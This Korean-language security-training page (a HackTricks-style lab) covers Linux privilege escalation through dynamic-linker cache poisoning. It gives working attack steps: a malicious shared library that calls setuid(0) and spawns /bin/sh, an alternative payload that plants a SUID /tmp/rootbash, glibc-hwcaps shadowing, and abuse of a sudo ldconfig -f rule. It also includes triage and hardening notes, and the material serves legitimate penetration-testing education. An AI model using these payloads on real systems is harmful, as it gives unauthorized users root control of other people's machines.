# ld.so privesc exploit 예시

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 `/etc/ld.so.conf` 또는 `ldconfig`를 통한 **system linker cache poisoning**을 다루는 focused lab입니다. missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` 및 기타 일반적인 SUID linker abuse는 [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md)를 참조하세요.

## 환경 준비

다음 섹션에서 환경을 준비하는 데 사용할 파일의 code를 확인할 수 있습니다.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. 같은 폴더에 해당 파일들을 자신의 시스템에 **생성**합니다.
2. **library**를 **컴파일**합니다: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`를 `/usr/lib`에 **복사**하고 cache를 갱신합니다: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root 권한)
4. **executable**을 **컴파일**합니다: `gcc sharedvuln.c -o sharedvuln -lcustom`

### 환경 확인

_libcustom.so_가 _/usr/lib_에서 **로드**되고 binary를 **실행**할 수 있는지 확인합니다.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 유용한 triage 명령어

실제 target을 공격할 때는 binary가 필요로 하는 **정확한 library 이름**, loader가 **현재 resolve하고 있는 항목**, 그리고 live cache를 변경하지 않고도 쓰기 가능한 configured path를 확인해야 합니다.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd`는 **trusted** executable에만 사용하세요. 일부 구현이나 비정상적인 ELF interpreter는 attacker-controlled code를 실행할 수 있습니다. 대신 `objdump -p ./file | grep NEEDED`를 사용하면 direct dependencies를 안전하게 나열할 수 있습니다. trusted target의 경우, 확인된 interpreter를 `--list`와 함께 실행하면 실제 resolution 결과를 확인할 수 있습니다.<sup>[[4]](#references)</sup>

유용한 주의사항은 다음과 같습니다.

- `sudo echo ... > /etc/ld.so.conf.d/x.conf`는 보통 **작동하지 않습니다**. redirection이 현재 shell에서 수행되기 때문입니다. 대신
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`를 사용하세요.
- **SUID/privileged** binary는 **secure-execution mode**로 실행됩니다. `LD_LIBRARY_PATH`는 무시되고, `LD_PRELOAD`는 제한됩니다(slash가 포함된 이름은 무시되며, standard directories에 있고 setuid 표시가 된 library만 preload할 수 있습니다). root가 `ldconfig`를 실행하면 `/etc/ld.so.conf`에 나열된 directories가 `/etc/ld.so.cache`에 들어갈 수 있으므로, 이 misconfiguration은 여전히 privileged programs에 영향을 줄 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` 역시 secure-execution mode에서는 `/etc/suid-debug`가 존재하지 않는 한 무시됩니다. 따라서 privileged execution에서 output이 나오기를 기대하지 말고, 동등한 non-SUID run에서 trace를 수집하세요.<sup>[[1]](#references)</sup>
- glibc 2.33 이상에서는 dynamic loader가 `--list-diagnostics`도 제공합니다. hijack이 예상대로 동작하지 않을 때 machine-readable loader diagnostics와 built-in search-path 정보를 출력합니다.<sup>[[1]](#references)[[6]](#references)</sup>

### Cache와 SONAME 제약사항

`ldconfig`는 configured directory에 있는 모든 임의의 file을 cache하지 않습니다. ELF headers를 검사하고 `lib*.so*` 또는 `ld-*.so*`와 일치하는 names를 인식하며, 일반적인 `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain을 요구합니다. 따라서 injected object는 target architecture/class, 정확한 `DT_NEEDED` name(일반적으로 해당 object의 `DT_SONAME`), 그리고 victim이 resolve하는 모든 symbols/versions를 갖춰야 합니다.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
이 예제처럼 target-specific library를 우선 사용하세요. 불완전한 object로 일반적인 SONAME을 Shadowing하면, 의도한 privileged target이 실행되기 전에 해당 라이브러리를 resolve하는 모든 process가 중단될 수 있습니다.<sup>[[3]](#references)</sup>

## Exploit

이 시나리오에서는 관리자가 시스템의
`/etc/ld.so.conf`에 의해 포함되는 `/etc/ld.so.conf.d/` 아래의
파일에 취약한 항목을 추가했다고 가정합니다.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
취약한 폴더는 쓰기 권한이 있는 _/home/ubuntu/lib_입니다.\
해당 경로에서 다음 코드를 **Download and compile**하세요:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
나중에 **root**(또는 다른 privileged account)가 취약한 **binary**를 실행할 것으로 예상된다면, 일반적으로 interactive shell을 생성하는 대신 **root-owned artifact**를 남겨 두는 편이 좋습니다. 예:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
그런 다음 권한 있는 실행이 이루어지면 `/tmp/rootbash -p`를 사용할 수 있습니다.

이제 **잘못 구성된** 경로 안에 악성 libcustom 라이브러리를 **생성했으므로**, 성공적인 권한 있는 **`ldconfig`** 실행을 통해 기본 cache를 다시 빌드해야 합니다. 재부팅은 로컬 부팅 프로세스가 실제로 이를 호출하는 경우에만 도움이 됩니다. 그렇지 않으면 관리자의 조치를 기다리거나, 사용 가능한 경우 안전하지 않은 sudo 규칙을 사용하세요.<sup>[[2]](#references)</sup>

이 작업이 완료되면 **`sharedvuln` 실행 파일이 `libcustom.so` 라이브러리를 어디에서 로드하는지 다시 확인하세요**:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
보시다시피 **`/home/ubuntu/lib`에서 로드**하며, 어떤 사용자가 이를 실행하면 shell이 실행됩니다:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> 이 예제에서는 권한을 상승시키지 않았지만, 실행되는 명령을 수정하고 **root 또는 다른 권한이 높은 사용자가 취약한 binary를 실행할 때까지 기다리면** 권한을 상승시킬 수 있습니다.

### Modern `glibc-hwcaps` shadowing

glibc 2.33부터 loader는 **모든 library search directory** 내부의 `glibc-hwcaps/<level>/` 아래에 있는 최적화된 library를 우선 사용할 수 있습니다. 따라서 `/home/ubuntu/lib`만 확인하는 것으로는 충분하지 않습니다. `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`와 같이 쓰기가 가능한 호환 subdirectory가 `ldconfig`에 의해 index되면 base library를 shadowing할 수 있으며, 다른 CPU에서는 계속 base object를 사용합니다. 또한 이는 다른 CPU에서 validation이 수행될 때 놓칠 수 있는 architecture-selective hijack을 제공합니다.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
현재 glibc hardening 지침에서는 중복된 SONAME, 기본값이 아닌 search location, 그리고 `glibc-hwcaps` 하위 디렉터리에 있는 object를 피할 것을 권장합니다. Audit 관점에서는 설정된 디렉터리와 해당 디렉터리의 parent path component에 대해 소유권 및 쓰기 가능 여부를 재귀적으로 확인해야 합니다.<sup>[[3]](#references)</sup>

### 기타 misconfiguration - Same vuln

이전 예제에서는 관리자가 **`/etc/ld.so.conf.d/` 내부의 configuration file에 권한이 없는 폴더를 설정한** misconfiguration을 조작했습니다.\
하지만 동일한 vulnerability를 일으킬 수 있는 다른 misconfiguration도 있습니다. 로드된 **config file**에 대해 **write permission**을 보유하고 있거나, 쓰기 가능한 `/etc/ld.so.conf.d/` 디렉터리에 file을 생성할 수 있거나, `/etc/ld.so.conf`에 쓸 수 있다면 동일한 vulnerability를 설정하고 exploit할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**`ldconfig`에 대한 sudo privilege가 있다고 가정해 봅시다**.\
`-f`를 사용하면 **어떤 configuration file을 읽을지** `ldconfig`에 지정할 수 있으므로, attacker가 제어하는 디렉터리를 지정하는 file을 사용해 `ldconfig`가 해당 폴더들을 cache에 추가하도록 만들 수 있습니다.<sup>[[2]](#references)</sup>\
이제 "/tmp"를 load하는 데 필요한 file과 folder를 생성해 보겠습니다:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
이제 **이전 exploit**에서 설명한 것처럼 **`/tmp` 내부에 악성 라이브러리를 생성**합니다.\
그리고 마지막으로 path를 로드하고 binary가 라이브러리를 어디에서 로드하는지 확인합니다:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**보시다시피 `ldconfig`에 대한 sudo 권한이 있으면 동일한 vulnerability를 exploit할 수 있습니다.** 제한된 sudo rule을 평가할 때는 option 세부 사항이 중요합니다. `-f`는 다른 configuration을 선택하지만 여전히 `/etc/ld.so.cache`를 다시 빌드합니다. `-C`는 cache를 다른 위치로 redirect합니다. `-N`은 cache 재빌드를 방지합니다. `-X`는 link 업데이트를 방지하지만 **`-N`과 함께 사용하지 않는 한 여전히 cache를 다시 빌드합니다**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
